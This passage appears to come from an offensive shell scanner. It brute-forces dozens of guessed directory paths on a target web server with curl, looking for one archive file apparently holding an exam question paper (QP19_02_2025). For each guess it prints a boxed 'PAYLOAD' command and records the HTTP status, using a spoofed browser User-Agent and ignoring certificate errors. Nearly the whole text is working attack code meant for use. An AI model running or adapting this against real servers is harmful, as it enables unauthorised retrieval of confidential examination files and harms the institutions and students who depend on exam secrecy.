" "${target}QPWorkflowCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
